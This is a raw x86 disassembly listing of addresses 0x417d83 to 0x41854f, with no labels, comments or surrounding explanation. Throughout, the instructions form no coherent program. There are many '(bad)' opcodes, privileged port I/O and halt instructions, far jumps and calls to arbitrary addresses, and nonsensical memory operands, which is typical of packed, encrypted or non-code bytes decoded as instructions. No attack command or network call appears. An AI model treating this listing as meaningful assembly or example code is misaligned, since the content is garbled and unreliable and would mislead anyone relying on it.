  417d83:	psubsw mm4,QWORD PTR [ecx]
  417d86:	mov    dl,al
  417d88:	xchg   BYTE PTR [edx-0x4d24d69],dh
  417d8e:	cmp    BYTE PTR [edi],bh
  417d90:	sbb    edx,esp
  417d92:	mov    ds:0x2fdeffd1,al
  417d97:	sub    cl,bl
  417d99:	test   eax,0x4d5e9a02
  417d9e:	cdq    
  417d9f:	rol    BYTE PTR [ecx-0xe492d5b],0xd7
  417da6:	push   esi
  417da7:	jmp    0x64f10b0f
  417dac:	aaa    
  417dad:	pop    ebx
  417dae:	fld    TBYTE PTR [eax+0x4b]
  417db1:	pop    edx
  417db2:	mov    eax,ds:0xefae80d7
  417db7:	int    0x17
  417db9:	sbb    BYTE PTR [edi+0x44c255a],0xe
  417dc0:	(bad)  
  417dc1:	lods   al,BYTE PTR ds:[esi]
  417dc2:	daa    
  417dc3:	loopne 0x417e0d
  417dc5:	pop    ecx
  417dc6:	outs   dx,BYTE PTR ds:[esi]
  417dc7:	jecxz  0x417db8
  417dc9:	add    DWORD PTR [eax+esi*2],ebp
  417dcc:	and    BYTE PTR [ebx-0x2f],dl
  417dcf:	cmp    cl,BYTE PTR [edi-0x61]
  417dd2:	mov    al,0x46
  417dd4:	sbb    eax,0xe6be4833
  417dd9:	add    eax,0x583d16cf
  417dde:	xchg   ecx,eax
  417ddf:	add    bl,BYTE PTR es:[esi]
  417de2:	or     DWORD PTR [ebp-0x46],0xfffffffc
  417de6:	scas   eax,DWORD PTR es:[edi]
  417de7:	or     BYTE PTR [ebx+ebx*2],ch
  417dea:	jecxz  0x417d80
  417dec:	mov    al,ds:0xab0668ef
  417df1:	mov    bl,0x4e
  417df3:	xchg   ebp,eax
  417df4:	retf   0x30c4
  417df7:	das    
  417df8:	adc    edx,DWORD PTR [edi+0x7dd536f3]
  417dfe:	or     al,0xb6
  417e00:	fadd   st,st(1)
  417e02:	dec    ecx
  417e03:	leave  
  417e04:	cmp    edi,DWORD PTR [ecx+ebp*8]
  417e07:	mov    ds:0xaf4463e0,al
  417e0c:	clc    
  417e0d:	add    eax,0x89bd11a0
  417e12:	leave  
  417e13:	inc    edx
  417e14:	add    cl,bl
  417e16:	psubsw mm6,QWORD PTR [esi+0x5e61bb7f]
  417e1d:	inc    eax
  417e1e:	mov    dl,0xb
  417e20:	adc    esi,DWORD PTR [edi-0x786c298e]
  417e26:	xchg   ebx,eax
  417e27:	gs aas 
  417e29:	js     0x417df8
  417e2b:	pop    ss
  417e2c:	stos   DWORD PTR es:[edi],eax
  417e2d:	iret   
  417e2e:	xor    ebp,DWORD PTR [ecx-0x7d]
  417e31:	in     al,0x3d
  417e33:	or     BYTE PTR [edx-0xe2f4c94],dh
  417e39:	ins    DWORD PTR es:[edi],dx
  417e3a:	hlt    
  417e3b:	je     0x417e67
  417e3d:	ja     0x417e09
  417e3f:	shl    BYTE PTR [eax],0x4
  417e42:	cmc    
  417e43:	mov    ds:0x209e79cf,al
  417e48:	push   edx
  417e49:	(bad)  
  417e4a:	sub    al,0x94
  417e4c:	in     eax,dx
  417e4d:	add    DWORD PTR [esi],ebx
  417e4f:	fiadd  WORD PTR [ebx+0x22]
  417e52:	ror    cl,0xfc
  417e55:	fs mov ebx,0x744df720
  417e5b:	inc    esp
  417e5c:	sbb    BYTE PTR [eax+ebp*4],cl
  417e5f:	inc    ecx
  417e60:	dec    dh
  417e62:	mov    cl,0xab
  417e64:	push   0x1b92e620
  417e69:	lods   al,BYTE PTR ds:[esi]
  417e6a:	xchg   ch,dl
  417e6c:	jge    0x417eca
  417e6e:	mov    ebx,DWORD PTR [edi-0x2b2996fc]
  417e74:	adc    cl,BYTE PTR cs:[edi-0x78ab8db]
  417e7b:	mov    bl,0x1a
  417e7d:	inc    edx
  417e7e:	daa    
  417e7f:	cmp    BYTE PTR [esi],bh
  417e81:	pusha  
  417e82:	push   ds
  417e83:	sub    BYTE PTR [ecx+ecx*8+0x1803eaf8],ah
  417e8a:	cmp    al,0x54
  417e8c:	mov    si,0x9073
  417e90:	loopne 0x417e5a
  417e92:	xchg   edi,eax
  417e93:	loopne 0x417e63
  417e95:	retf   0xe7ad
  417e98:	mov    bl,0xaf
  417e9a:	jmp    0x417ebb
  417e9c:	pop    edi
  417e9d:	dec    esp
  417e9e:	cmp    DWORD PTR [ebp-0xa],esp
  417ea1:	mov    edi,edx
  417ea3:	mov    ecx,0x46b7efa
  417ea8:	mov    DWORD PTR [edi+eax*1-0x2145aec],0x5e4e0600
  417eb3:	in     al,dx
  417eb4:	shld   DWORD PTR [edi],edi,0x6a
  417eb8:	pop    ds
  417eb9:	adc    bl,dl
  417ebb:	jge    0x417ee8
  417ebd:	dec    edx
  417ebe:	jno    0x417e56
  417ec0:	aam    0xb8
  417ec2:	jo     0x417e77
  417ec4:	mov    WORD PTR [ebp+edi*2-0x4f7b1617],?
  417ecb:	sub    eax,0xe8e2563a
  417ed0:	sub    eax,0x285525b
  417ed5:	pusha  
  417ed6:	mov    ebx,0xf244337b
  417edb:	mov    eax,0xba5d3685
  417ee0:	or     eax,0xa67b0fb9
  417ee5:	rcl    DWORD PTR [ebx+ebx*1],1
  417ee8:	test   DWORD PTR [edx+0x50],ebp
  417eeb:	jmp    0x417ee7
  417eed:	pop    eax
  417eee:	and    esp,edx
  417ef0:	mov    ch,0xfc
  417ef2:	adc    eax,0xc3a2a556
  417ef7:	xchg   ebx,eax
  417ef8:	dec    ecx
  417ef9:	int3   
  417efa:	jg     0x417eb5
  417efc:	inc    edx
  417efd:	pop    ebp
  417efe:	pushf  
  417eff:	jns    0x417f53
  417f01:	mov    esp,0x8b24c4d6
  417f06:	fidivr DWORD PTR [ebx]
  417f08:	mov    dl,0x2d
  417f0a:	xchg   edx,eax
  417f0b:	xor    dh,BYTE PTR [eax+0x20]
  417f0e:	fsubp  st(1),st
  417f10:	sub    esi,edx
  417f12:	icebp  
  417f13:	lds    edx,FWORD PTR [esi-0x56]
  417f16:	loope  0x417ebd
  417f18:	out    dx,eax
  417f19:	mov    dh,0xd
  417f1b:	cmp    esp,esp
  417f1d:	and    eax,0x17df746d
  417f22:	mov    esi,0x4803e2c9
  417f27:	lods   eax,DWORD PTR ss:[esi]
  417f29:	addr16 inc ebp
  417f2b:	fisttp QWORD PTR [esi]
  417f2d:	mov    al,0xef
  417f2f:	in     al,0x92
  417f31:	dec    ecx
  417f32:	add    ebx,edi
  417f34:	hlt    
  417f35:	push   ebp
  417f36:	lods   al,BYTE PTR ds:[esi]
  417f37:	inc    ebx
  417f38:	mov    ebx,0xe6e6a8b0
  417f3d:	add    ah,BYTE PTR [edi]
  417f3f:	neg    DWORD PTR [eax+0x51504f9f]
  417f45:	rcr    BYTE PTR [edi+0x718a0fcb],1
  417f4b:	mov    ebx,0xf18b975
  417f50:	(bad)  
  417f51:	je     0x417fb4
  417f53:	push   ds
  417f54:	jl     0x417f08
  417f56:	ins    DWORD PTR es:[edi],dx
  417f57:	inc    ebx
  417f58:	jno    0x417f4a
  417f5a:	fimul  DWORD PTR [edi]
  417f5c:	pushf  
  417f5d:	push   esi
  417f5e:	dec    ebp
  417f5f:	pop    eax
  417f60:	pslld  mm1,QWORD PTR [ebx]
  417f63:	jo     0x417ef7
  417f65:	lds    edi,FWORD PTR [ecx-0x6669ca81]
  417f6b:	pop    ds
  417f6c:	push   ebp
  417f6d:	sub    eax,0xd70c93c9
  417f72:	enter  0x52ca,0x6
  417f76:	out    dx,eax
  417f77:	mov    DWORD PTR [ebp+0x762d9043],ecx
  417f7d:	les    esi,FWORD PTR fs:[edx+0x7c]
  417f81:	adc    DWORD PTR [eax+0x7],0xbcc38f3c
  417f88:	fistp  DWORD PTR [esp+ebp*2-0x6a]
  417f8c:	jbe    0x418007
  417f8e:	ins    DWORD PTR es:[edi],dx
  417f8f:	cmc    
  417f90:	mov    ebp,DWORD PTR [eax]
  417f92:	test   BYTE PTR [edi],0x30
  417f95:	fild   DWORD PTR [ecx+edi*1-0x3287e861]
  417f9c:	mov    edx,0xbed7fd3c
  417fa1:	call   0x87a61981
  417fa6:	mov    WORD PTR [eax-0x76a91422],fs
  417fac:	mov    al,0xef
  417fae:	out    0x6f,eax
  417fb0:	daa    
  417fb1:	dec    ebp
  417fb2:	mov    eax,0x52f3360f
  417fb7:	sub    eax,0xf320165f
  417fbc:	xchg   esp,eax
  417fbd:	pushf  
  417fbe:	jae    0x417fd5
  417fc0:	adc    al,0xcc
  417fc2:	cmp    BYTE PTR [edi+0x3c],cl
  417fc5:	jnp    0x417fd3
  417fc7:	jbe    0x417fae
  417fc9:	xor    ah,BYTE PTR [edi+0x45]
  417fcc:	out    dx,eax
  417fcd:	xor    eax,ebx
  417fcf:	dec    edx
  417fd0:	xchg   ebx,eax
  417fd1:	mov    ah,BYTE PTR ds:0x3121436c
  417fd7:	jle    0x41801c
  417fd9:	stos   BYTE PTR es:[edi],al
  417fda:	scas   al,BYTE PTR es:[edi]
  417fdb:	loopne 0x418051
  417fdd:	xor    edi,DWORD PTR [ebp+ebp*8+0x7f]
  417fe1:	pop    edx
  417fe2:	mov    ds,WORD PTR [ebp-0x25b7d303]
  417fe8:	cmp    DWORD PTR [edx+0x3a2e4c40],eax
  417fee:	es leave 
  417ff0:	ss stos DWORD PTR es:[edi],eax
  417ff2:	push   esp
  417ff3:	imul   edx,edi,0xffffffa7
  417ff6:	mov    BYTE PTR [ecx-0x17],bh
  417ff9:	shr    DWORD PTR [ecx-0x15],1
  417ffc:	or     BYTE PTR [ebx+ebp*1-0x7085643e],al
  418003:	xchg   ebp,eax
  418004:	ss (bad) 
  418008:	aas    
  418009:	out    dx,al
  41800a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41800b:	adc    al,0x38
  41800d:	cld    
  41800e:	and    al,0xf
  418010:	ror    DWORD PTR [edi+0x32c7ef0c],0x2d
  418017:	outs   dx,DWORD PTR ds:[esi]
  418018:	add    esi,DWORD PTR [edi+esi*4+0x514794a7]
  41801f:	int3   
  418020:	stc    
  418021:	ja     0x418002
  418023:	adc    BYTE PTR [ebx+ecx*2+0x7b],ah
  418027:	cmc    
  418028:	cmp    esp,DWORD PTR [eax+eax*2-0x22]
  41802c:	mov    eax,0xc909a88c
  418031:	mov    ds:0x1f3164b5,eax
  418036:	jmp    0x9a43:0x979e65ae
  41803d:	push   ecx
  41803e:	iret   
  41803f:	push   cs
  418040:	xor    eax,0x218f74dd
  418045:	mov    bl,BYTE PTR [ebp-0x1becb2dc]
  41804b:	push   ecx
  41804c:	dec    ebp
  41804d:	and    eax,0xb79335e9
  418052:	icebp  
  418053:	outs   dx,DWORD PTR ds:[esi]
  418054:	dec    eax
  418055:	push   ecx
  418056:	mov    ds:0xcf038c7b,al
  41805b:	adc    al,0x12
  41805d:	neg    BYTE PTR [edx]
  41805f:	loope  0x4180d4
  418061:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  418063:	add    al,0x2b
  418065:	rcr    DWORD PTR [ecx+0x23],1
  418068:	add    ch,BYTE PTR [edx-0x6d]
  41806b:	pop    edi
  41806c:	imul   esi,DWORD PTR [ebx-0x3f],0x41
  418070:	loopne 0x418020
  418072:	retf   0x4cf4
  418075:	push   ebx
  418076:	sti    
  418077:	std    
  418078:	shr    DWORD PTR [ebp+0x27],1
  41807b:	lds    edi,FWORD PTR [esi-0x2f]
  41807e:	jecxz  0x418006
  418080:	xor    ch,BYTE PTR [eax+0x4c4b7228]
  418086:	sar    ch,cl
  418088:	lock and eax,0xe73bd66b
  41808e:	es pop esp
  418090:	mov    BYTE PTR [ebx+0x6f],cl
  418093:	icebp  
  418094:	jl     0x418073
  418096:	aam    0x81
  418098:	icebp  
  418099:	adc    DWORD PTR [edx],ebx
  41809b:	add    DWORD PTR [eax+edi*8+0x455be1f3],eax
  4180a2:	popa   
  4180a3:	(bad)  
  4180a4:	(bad)  
  4180a5:	jae    0x4180f7
  4180a7:	leave  
  4180a8:	jl     0x418038
  4180aa:	test   BYTE PTR [esi-0x5b37bfd5],bl
  4180b0:	aad    0xc9
  4180b2:	or     eax,0xcf49e583
  4180b7:	cwde   
  4180b8:	add    eax,0xb551491d
  4180bd:	daa    
  4180be:	push   esi
  4180bf:	mov    edx,0x3f3a0926
  4180c4:	retf   
  4180c5:	mov    ch,0x66
  4180c7:	cmp    al,0x66
  4180c9:	ret    
  4180ca:	mov    WORD PTR [edx],ds
  4180cc:	sub    cl,0xa4
  4180cf:	in     al,dx
  4180d0:	out    0x58,al
  4180d2:	retf   
  4180d3:	adc    ebx,esi
  4180d5:	or     DWORD PTR [esi+eiz*8-0x5b],ebp
  4180d9:	mov    esi,0x54490044
  4180de:	ret    0xcedd
  4180e1:	cmp    edx,edx
  4180e3:	pop    esi
  4180e4:	push   0x3f
  4180e6:	in     al,0xc5
  4180e8:	stos   DWORD PTR es:[edi],eax
  4180e9:	fmul   st,st(7)
  4180eb:	inc    esi
  4180ec:	test   DWORD PTR [eax+edi*8],0x2ccb4e15
  4180f3:	cmp    al,0xd3
  4180f5:	outs   dx,BYTE PTR ds:[esi]
  4180f6:	or     BYTE PTR [ebx-0x6c6c993b],dl
  4180fc:	loop   0x418152
  4180fe:	(bad)  
  4180ff:	and    ebx,DWORD PTR [edx-0x19]
  418102:	mov    bh,0x21
  418104:	pop    edx
  418105:	jle    0x418168
  418107:	push   ebx
  418108:	push   ebp
  418109:	mov    edx,0x47130cd
  41810e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41810f:	or     DWORD PTR [ecx],ecx
  418111:	ret    
  418112:	fcom   DWORD PTR [ebx]
  418114:	icebp  
  418115:	inc    BYTE PTR ds:0xf351c38e
  41811b:	adc    BYTE PTR [ebp+esi*2+0x5a],dh
  41811f:	fstp   DWORD PTR [ebp+edx*2+0x2a]
  418123:	mov    cl,0x9b
  418125:	out    dx,al
  418126:	mov    ah,0x9
  418128:	mov    dh,0xf7
  41812a:	test   DWORD PTR [ebp+edx*1-0x17],eax
  41812e:	or     BYTE PTR [eax],al
  418130:	mov    edx,0xf6757ea5
  418135:	xor    ebx,esp
  418137:	xor    al,0xbf
  418139:	int3   
  41813a:	adc    eax,0x8cb7aeb6
  41813f:	cmp    eax,0xf3ee39cd
  418144:	into   
  418145:	fwait
  418146:	inc    ecx
  418147:	mov    fs,esi
  418149:	test   ch,0x99
  41814c:	inc    ecx
  41814d:	jb     0x41816e
  41814f:	xchg   ecx,eax
  418150:	mov    ecx,0x6cf1d535
  418155:	xlat   BYTE PTR ds:[ebx]
  418156:	in     eax,0x56
  418158:	xchg   esi,eax
  418159:	or     edi,eax
  41815b:	pop    eax
  41815c:	es scas eax,DWORD PTR es:[edi]
  41815e:	xor    DWORD PTR [ebp+0x1c],edi
  418161:	cmp    bh,BYTE PTR [edi]
  418163:	push   0x40
  418165:	stos   BYTE PTR es:[edi],al
  418166:	dec    esp
  418167:	test   DWORD PTR [edx+0x2d],eax
  41816a:	fcomp  DWORD PTR [eax]
  41816c:	cld    
  41816d:	and    edi,DWORD PTR [ebx]
  41816f:	(bad)  [edx+0x5d]
  418172:	push   ds
  418173:	pop    ss
  418174:	xchg   DWORD PTR ds:0x73d6167f,esp
  41817a:	fwait
  41817b:	jno    0x418155
  41817d:	xchg   edi,eax
  41817e:	mov    BYTE PTR [ebp+edi*4-0x2a],bl
  418182:	jno    0x41814b
  418184:	mov    al,ds:0x4b7c6b60
  418189:	(bad)  
  41818a:	and    al,0x51
  41818c:	ins    DWORD PTR es:[edi],dx
  41818d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41818e:	pop    edx
  41818f:	icebp  
  418190:	mov    BYTE PTR [esi+0x720efe5b],ah
  418196:	or     eax,0x65684dea
  41819b:	pop    edx
  41819c:	or     DWORD PTR [edi-0x532da920],ecx
  4181a2:	sub    eax,0xa4a9c235
  4181a7:	(bad)  
  4181a8:	ss sbb BYTE PTR fs:[ecx],0x2b
  4181ad:	not    BYTE PTR [ecx]
  4181af:	xor    DWORD PTR [ecx-0x2e],edi
  4181b2:	jecxz  0x418215
  4181b4:	mov    ds:0x314606f7,al
  4181b9:	or     cl,dh
  4181bb:	mov    bh,BYTE PTR ss:[esi+0x62b32a4c]
  4181c2:	mov    ebx,0x8023d766
  4181c7:	mov    edx,0xce3603db
  4181cc:	add    ecx,DWORD PTR [edx+esi*8-0x22]
  4181d0:	and    DWORD PTR [esi+0x420d6e81],ebp
  4181d6:	sub    edi,esi
  4181d8:	fwait
  4181d9:	jg     0x418235
  4181db:	aas    
  4181dc:	xor    eax,0xb6315a51
  4181e1:	imul   ebx,DWORD PTR [edi-0x27],0x8baa2d68
  4181e8:	sbb    al,0x6b
  4181ea:	inc    edx
  4181eb:	jo     0x4181c9
  4181ed:	out    0xf7,eax
  4181ef:	ret    0x2bcc
  4181f2:	pop    esi
  4181f3:	push   0x7fd65df7
  4181f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181f9:	dec    ebx
  4181fa:	pop    esp
  4181fb:	sub    al,0x9c
  4181fd:	adc    BYTE PTR [edx+0x8ab48c9],bl
  418203:	(bad)  
  418204:	jmp    0x4181da
  418206:	(bad)  
  418207:	push   ds
  418208:	add    al,0x37
  41820a:	ret    0x92dd
  41820d:	js     0x418215
  41820f:	in     eax,dx
  418210:	inc    eax
  418211:	pop    edi
  418212:	loop   0x418229
  418214:	mov    al,0xec
  418216:	inc    edx
  418217:	(bad)  
  418218:	sahf   
  418219:	jbe    0x41825e
  41821b:	mov    edx,0x2c981d37
  418220:	ds or  eax,0x7c954545
  418226:	ins    BYTE PTR es:[edi],dx
  418227:	lods   al,BYTE PTR ds:[esi]
  418228:	pop    edi
  418229:	mov    esp,0xcc940a49
  41822e:	ss (bad) 
  418230:	icebp  
  418231:	or     BYTE PTR [edi-0x1f],0x3d
  418235:	push   esi
  418236:	test   DWORD PTR [esi-0x58],0xbf5a3075
  41823d:	xchg   ecx,eax
  41823e:	mov    ebx,0x643e7fba
  418243:	mov    edx,0x307b4e07
  418248:	dec    eax
  418249:	push   ecx
  41824a:	jbe    0x4182a0
  41824c:	cmp    edx,DWORD PTR ds:0xf838b994
  418252:	xor    DWORD PTR [edx-0x4a1022fc],0xd790f681
  41825c:	xor    eax,0x3d26256
  418261:	cmp    eax,0x1e52fa36
  418266:	inc    ebp
  418267:	mov    ebp,0x44fbf8fa
  41826c:	pop    ss
  41826d:	inc    esp
  41826e:	stc    
  41826f:	ja     0x418289
  418271:	lock sar DWORD PTR [eax-0x5e5851eb],1
  418278:	sbb    dl,BYTE PTR ds:0xefbdcf3
  41827e:	mov    ah,0xea
  418280:	stc    
  418281:	inc    ebp
  418282:	mov    ch,0x59
  418284:	xchg   ebp,eax
  418285:	into   
  418286:	jge    0x4182f8
  418288:	add    bh,BYTE PTR [edx]
  41828a:	sti    
  41828b:	mov    eax,ds:0xb4d77ecc
  418290:	inc    esi
  418291:	sbb    ebp,DWORD PTR ds:0xbfb7d717
  418297:	xchg   edx,eax
  418298:	sbb    eax,0x8866a55
  41829d:	cli    
  41829e:	fdivr  QWORD PTR [ecx-0x43a93a9f]
  4182a4:	adc    dh,cl
  4182a6:	rcl    DWORD PTR [ebx-0x5f],1
  4182a9:	lods   al,BYTE PTR ds:[esi]
  4182aa:	fidivr DWORD PTR [esi]
  4182ac:	cmp    eax,0x6e36abad
  4182b1:	shl    DWORD PTR [eax+0x43],0x6
  4182b5:	sub    DWORD PTR [edx+0x79d9fa1c],0x67e5442e
  4182bf:	lock pop es
  4182c1:	dec    ebx
  4182c2:	push   0x32
  4182c4:	loop   0x4182ce
  4182c6:	nop
  4182c7:	jne    0x418323
  4182c9:	xor    bl,0x7e
  4182cc:	jmp    0x14a18c06
  4182d1:	adc    al,0x3e
  4182d3:	hlt    
  4182d4:	jno    0x41829b
  4182d6:	retf   
  4182d7:	stos   DWORD PTR es:[edi],eax
  4182d8:	adc    eax,0x110618e5
  4182dd:	or     BYTE PTR [esi],al
  4182df:	jl     0x4182ad
  4182e1:	sbb    ebx,DWORD PTR [esi]
  4182e3:	jle    0x41833a
  4182e5:	popa   
  4182e6:	dec    bh
  4182e8:	cmp    al,0x1
  4182ea:	xchg   edi,eax
  4182eb:	jbe    0x4182e8
  4182ed:	xchg   BYTE PTR [edi-0x6975901a],al
  4182f3:	jno    0x4182fc
  4182f5:	lods   al,BYTE PTR ds:[esi]
  4182f6:	cwde   
  4182f7:	and    dh,BYTE PTR [ebp+0x720c4b9b]
  4182fd:	call   0x2db1:0x8b9f9910
  418304:	out    0x57,al
  418306:	or     BYTE PTR [ebx-0x3f],dl
  418309:	and    dh,BYTE PTR [eax+0x4a5c1923]
  41830f:	lahf   
  418310:	lea    ecx,[eax]
  418312:	pop    ebp
  418313:	adc    bh,BYTE PTR [ebp-0x42d27dd1]
  418319:	pop    edx
  41831a:	add    eax,0x656acd00
  41831f:	(bad)  [edx]
  418321:	mov    esi,0x10143bf1
  418326:	inc    ebp
  418327:	sahf   
  418328:	fucom  st(6)
  41832a:	outs   dx,BYTE PTR ds:[esi]
  41832b:	cld    
  41832c:	je     0x41831f
  41832e:	dec    esi
  41832f:	test   DWORD PTR [edx+0x111e31f7],ebx
  418335:	pop    ebx
  418336:	int3   
  418337:	shl    DWORD PTR [edi+ebp*1-0x70e95e37],cl
  41833e:	push   ecx
  41833f:	(bad)
  418342:	stos   DWORD PTR es:[edi],eax
  418343:	popf   
  418344:	sub    DWORD PTR [esi+0x6e],edi
  418347:	cmp    al,0x93
  418349:	mov    ecx,0x9abd97ac
  41834e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41834f:	leave  
  418350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418351:	out    0xb4,al
  418353:	add    eax,0x50f0346d
  418358:	dec    ecx
  418359:	or     DWORD PTR [edx],edx
  41835b:	imul   ebp,DWORD PTR [ecx-0x55],0x61247c0a
  418362:	hlt    
  418363:	mov    WORD PTR [esi+0x6f4e8870],ss
  418369:	or     ebp,0xe
  41836c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41836d:	add    DWORD PTR [ecx],0x8748adc4
  418373:	jns    0x418317
  418375:	popa   
  418376:	mov    esi,0x84bd5c30
  41837b:	jnp    0x4183ad
  41837d:	cld    
  41837e:	and    dh,ah
  418380:	jae    0x41839d
  418382:	out    0x7f,eax
  418384:	push   es
  418385:	out    0xd2,eax
  418387:	push   ecx
  418388:	xlat   BYTE PTR ds:[ebx]
  418389:	and    esi,edx
  41838b:	adc    al,0xf5
  41838d:	or     dl,dl
  41838f:	js     0x41835e
  418391:	sbb    eax,0x1c85348d
  418396:	add    al,0x18
  418398:	fdiv   QWORD PTR [ecx+0x7f]
  41839b:	ret    
  41839c:	lahf   
  41839d:	mov    dh,0x91
  41839f:	gs in  eax,dx
  4183a1:	cmp    DWORD PTR [ebx],ebp
  4183a3:	xor    dh,BYTE PTR ds:0x2f8ac113
  4183a9:	enter  0x6eb4,0xb0
  4183ad:	jp     0x4183a2
  4183af:	or     al,BYTE PTR [edx]
  4183b1:	ret    
  4183b2:	and    dh,0x21
  4183b5:	lahf   
  4183b6:	loope  0x41834b
  4183b8:	mov    eax,0xfbc51716
  4183bd:	and    bl,al
  4183bf:	hlt    
  4183c0:	loopne 0x418396
  4183c2:	mov    ecx,0xe5899950
  4183c7:	sbb    edx,DWORD PTR [esi]
  4183c9:	addr16 fdivrp st(0),st
  4183cc:	mov    ebp,0x7f8c71a2
  4183d1:	mov    esp,0x5ff7006c
  4183d6:	popa   
  4183d7:	sub    DWORD PTR [esi],eax
  4183d9:	dec    ebx
  4183da:	jb     0x418367
  4183dc:	or     cl,ah
  4183de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183df:	push   0xb9e0fb70
  4183e4:	inc    esp
  4183e5:	ds inc ebp
  4183e7:	add    DWORD PTR [edi+0x133c81d6],esp
  4183ed:	jb     0x418446
  4183ef:	jbe    0x4183a0
  4183f1:	inc    edi
  4183f2:	gs ss (bad) 
  4183f5:	sub    al,0x2
  4183f7:	(bad)  
  4183f8:	lahf   
  4183f9:	jmp    0x4183a8
  4183fb:	cmp    bl,al
  4183fd:	xlat   BYTE PTR ds:[ebx]
  4183fe:	jbe    0x41840a
  418400:	es dec ebx
  418402:	neg    DWORD PTR [ecx]
  418404:	push   ebp
  418405:	(bad)  
  418406:	ss or  ch,0xa2
  41840a:	dec    ebx
  41840b:	mov    al,0x22
  41840d:	sar    BYTE PTR [eax-0x23],cl
  418410:	rol    edi,cl
  418412:	pop    eax
  418413:	pop    eax
  418414:	push   esp
  418415:	int3   
  418416:	push   edx
  418417:	cwde   
  418418:	scas   al,BYTE PTR es:[edi]
  418419:	test   dl,bh
  41841b:	stos   DWORD PTR es:[edi],eax
  41841c:	pop    ss
  41841d:	pop    ecx
  41841e:	xlat   BYTE PTR ds:[ebx]
  41841f:	adc    bh,BYTE PTR ds:0xbb7e43e4
  418425:	cs cmp al,0x67
  418428:	lock dec ebx
  41842a:	fwait
  41842b:	inc    esi
  41842c:	mov    edx,0x98f9cc9e
  418431:	hlt    
  418432:	stos   DWORD PTR es:[edi],eax
  418433:	pop    ebx
  418434:	loop   0x41844d
  418436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418437:	add    al,0x85
  418439:	call   0xb38fefd8
  41843e:	(bad)  
  41843f:	and    al,0xed
  418441:	in     al,dx
  418442:	mov    es,WORD PTR [esi]
  418444:	fidivr DWORD PTR [edx-0x41c68ecc]
  41844a:	ret    0x32d4
  41844d:	jbe    0x418496
  41844f:	es inc eax
  418451:	gs jecxz 0x41845e
  418454:	cmp    DWORD PTR [esi+0x4],edx
  418457:	cmp    edx,DWORD PTR [esi]
  418459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41845a:	pop    eax
  41845b:	sbb    BYTE PTR [edi-0x6d],dh
  41845e:	pushf  
  41845f:	ror    BYTE PTR [esi-0x6c],1
  418462:	jmp    0x418472
  418464:	cmp    dh,BYTE PTR [ebp+0x221f74ea]
  41846a:	call   0xa3ea:0x93da53c2
  418471:	jnp    0x4184d4
  418473:	imul   ebx,DWORD PTR [ecx+ebp*2],0x48375703
  41847a:	scas   eax,DWORD PTR es:[edi]
  41847b:	cmp    al,0x8a
  41847d:	mov    ah,0x29
  41847f:	sahf   
  418480:	(bad)  
  418481:	push   cs
  418482:	retf   0xfa67
  418485:	inc    ecx
  418486:	mov    WORD PTR [ecx-0x14],?
  418489:	popf   
  41848a:	sbb    dl,bh
  41848c:	cmp    BYTE PTR [esi+eiz*4-0x1ed5e5a2],dl
  418493:	cmc    
  418494:	add    dl,BYTE PTR [ebx]
  418496:	cmp    dh,BYTE PTR [esi]
  418498:	shl    edx,0xd3
  41849b:	(bad)  
  41849d:	(bad)  
  41849f:	test   eax,0xb091c691
  4184a4:	xchg   esi,eax
  4184a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a6:	iret   
  4184a7:	jl     0x418465
  4184a9:	int    0xfc
  4184ab:	xchg   edx,eax
  4184ac:	push   ss
  4184ad:	and    DWORD PTR [edi+0x74],ecx
  4184b0:	cmp    DWORD PTR [esi-0x38],edi
  4184b3:	jne    0x4184ec
  4184b5:	inc    edx
  4184b6:	push   ds
  4184b7:	(bad)  
  4184b8:	jmp    0x41843d
  4184ba:	jo     0x418482
  4184bc:	popa   
  4184bd:	es mov ecx,0xe7d71f02
  4184c3:	or     BYTE PTR [edi+ebp*2+0x17],bl
  4184c7:	jecxz  0x418489
  4184c9:	add    DWORD PTR [ebx+eiz*4+0x5c],esi
  4184cd:	push   ecx
  4184ce:	xchg   edx,eax
  4184cf:	mov    ds:0xa43e4fb1,eax
  4184d4:	loopne 0x418491
  4184d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184d7:	stc    
  4184d8:	push   eax
  4184d9:	or     esp,DWORD PTR [ebx+0x49]
  4184dc:	adc    BYTE PTR [ebx+0x4ffe0830],al
  4184e2:	in     eax,dx
  4184e3:	mov    al,ds:0xb04f7257
  4184e8:	jae    0x41852e
  4184ea:	mov    esi,0xa54539fd
  4184ef:	out    0xe9,al
  4184f1:	rol    BYTE PTR [esi],0xbc
  4184f4:	cmp    bh,BYTE PTR [ebx+0x44]
  4184f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184f8:	aas    
  4184f9:	std    
  4184fa:	push   eax
  4184fb:	adc    eax,0xf566deb4
  418500:	jb     0x41856f
  418502:	mov    esp,0x996ad507
  418507:	xlat   BYTE PTR ds:[ebx]
  418508:	test   esp,ebp
  41850a:	je     0x41857d
  41850c:	out    0xdb,eax
  41850e:	xchg   ebp,eax
  41850f:	jne    0x4184ea
  418511:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418513:	imul   BYTE PTR [ebp-0x1c5d16cf]
  418519:	int    0x66
  41851b:	pop    ecx
  41851c:	outs   dx,DWORD PTR ds:[esi]
  41851d:	adc    al,0xc3
  41851f:	cmp    BYTE PTR [eax+ecx*1+0x3cd9541],dl
  418526:	adc    eax,0x76171d1b
  41852b:	adc    edi,DWORD PTR [esi+0x6e]
  41852e:	mov    bl,0x8f
  418530:	xor    DWORD PTR [edi+0x1d91d3cc],ebp
  418536:	inc    ecx
  418537:	or     dl,bl
  418539:	loope  0x4184fb
  41853b:	retf   0x3399
  41853e:	dec    dh
  418540:	xor    dh,BYTE PTR [ebx-0x30]
  418543:	xor    BYTE PTR [edi-0x58],bh
  418546:	lods   al,BYTE PTR ds:[esi]
  418547:	adc    ah,dh
  418549:	xor    ebx,DWORD PTR [ecx-0x7e974421]
  41854f:	and    DWORD PTR [eax],esp
